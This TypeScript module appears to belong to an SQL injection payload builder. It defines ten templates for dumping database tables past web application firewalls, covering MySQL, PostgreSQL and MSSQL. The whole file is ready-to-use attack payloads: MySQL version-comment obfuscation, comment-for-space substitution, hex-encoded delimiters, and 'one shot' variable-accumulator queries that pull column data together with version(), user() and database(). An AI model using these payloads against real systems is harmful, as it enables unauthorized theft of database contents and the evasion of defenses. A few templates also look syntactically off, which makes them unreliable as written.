import { BuilderSubcategory, TemplateConfig } from '../../types';

const standardDataParameters = [
  {
    id: 'database',
    label: 'Database',
    defaultValue: 'database()',
    inputType: 'text' as const
  },
  {
    id: 'table_name',
    label: 'Table name',
    defaultValue: 'table_name',
    inputType: 'text' as const
  },
  {
    id: 'column_name',
    label: 'Column name',
    defaultValue: 'column_1,0x3a,column_2,0x3a,column_3',
    inputType: 'text' as const
  }
];

export const dataTemplates: TemplateConfig[] = [
  {
    id: 'waf-data-group-concat',
    name: 'group_concat() WAF',
    description: 'WAF bypass data extraction with column concatenation and comments',
    content: '(/*!50000SELECT*//*!50000GROUP_CONCAT(column_1,0x3a,column_2,0x3a,column_3+SEPARATOR+0x3c62723e)*//*!50000FROM*//**/TABLE_NAME)',
    parameters: standardDataParameters
  },
  {
    id: 'waf-data-one-shot',
    name: 'one shot WAF (Variable Loop)',
    description: 'WAF bypass one shot data extraction using version comments and variable accumulator',
    content: '(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM/*!50000(TABLE_NAME)*/WHERE(@x)IN(@x:=CONCAT(0x20,@x,column_1,0x3a,column_2,0x3a,column_3,0x3c62723e))))x)',
    parameters: standardDataParameters
  },
  {
    id: 'waf-data-second-shot',
    name: 'second shot WAF',
    description: 'WAF bypass second shot data extraction',
    content: '(/*!50000SELECT*//*!50000GROUP_CONCAT(0x3c62723e,column_1,column_2,column_3)*//*!50000FROM*//**/TABLE_NAME)',
    parameters: standardDataParameters
  },
  {
    id: 'waf-data-third-shot',
    name: 'third shot WAF',
    description: 'WAF bypass third shot extraction with version comments',
    content: 'concat(0x4e747442656c6c203a3a20,/*!50000version()*/,0x3a3a3a,/*!50000user()*/,0x3a3a3a,/*!50000database()*/,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM/*!50000({table_name})*/WHERE(@x)IN(@x:=CONCAT(0x20,@x,column_1,column_2,column_3,0x3c62723e))))x))',
    parameters: standardDataParameters
  },
  {
    id: 'waf-data-concat-ws',
    name: 'concat_ws() WAF',
    description: 'WAF bypass data extraction using CONCAT_WS with comment delimiters',
    content: '(/*!50000SELECT*//*!50000GROUP_CONCAT*(CONCAT_WS(0x3a,column_1,0x3a,column_2,0x3a,column_3)+SEPARATOR+0x3c62723e)/*!50000FROM*//**/TABLE_NAME)',
    parameters: standardDataParameters
  },
  {
    id: 'waf-data-pagination-limit',
    name: 'Row-by-Row Pagination WAF (LIMIT 0,1)',
    description: 'WAF bypass row-by-row data extraction using version comments on LIMIT',
    content: '(/*!50000SELECT*//*!50000CONCAT_WS*/(0x3a,column_1,0x3a,column_2,0x3a,column_3)/*!50000FROM*//**/TABLE_NAME/*!50000LIMIT*//**/0,1)',
    parameters: standardDataParameters
  },
  {
    id: 'waf-data-mid-chunk',
    name: 'Chunk Extraction WAF (MID / SUBSTR)',
    description: 'WAF bypass chunked data extraction using version comments on MID',
    content: '(/*!50000SELECT*//*!50000MID*/(/*!50000GROUP_CONCAT*/(column_1,0x3a,column_2,0x3a,column_3),1,100)/*!50000FROM*//**/TABLE_NAME)',
    parameters: standardDataParameters
  },
  {
    id: 'waf-data-json-arrayagg',
    name: 'JSON_ARRAYAGG() WAF',
    description: 'WAF bypass JSON array data dumping format',
    content: '(/*!50000SELECT*//*!50000JSON_ARRAYAGG*/(JSON_OBJECT(0x64,column_1,0x3a,column_2,0x3a,column_3))/*!50000FROM*//**/TABLE_NAME)',
    parameters: standardDataParameters
  },
  {
    id: 'waf-data-postgre-string-agg',
    name: 'PostgreSQL STRING_AGG WAF Data Dump',
    description: 'WAF bypass PostgreSQL string_agg extraction using CHR() delimiters',
    content: '(SELECT/**/STRING_AGG(column_1,0x3a,column_2,0x3a,column_3,CHR(60)||CHR(98)||CHR(114)||CHR(62))/**/FROM/**/TABLE_NAME)',
    parameters: standardDataParameters
  },
  {
    id: 'waf-data-mssql-xml-path',
    name: 'MSSQL FOR XML PATH WAF Data Dump',
    description: 'WAF bypass MSSQL FOR XML PATH extraction using CHAR() delimiters',
    content: '(SELECT/**/column_1,0x3a,column_2,0x3a,column_3+CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)/**/FROM/**/TABLE_NAME/**/FOR/**/XML/**/PATH(CHAR(0)))',
    parameters: standardDataParameters
  }
];

export const dataSubcategory: BuilderSubcategory = {
  id: 'data',
  label: 'Data',
  description: 'WAF bypass data extraction templates (GROUP_CONCAT, One-Shot, CONCAT_WS, LIMIT, MID, JSON, PG/MSSQL)',
  templates: dataTemplates
};
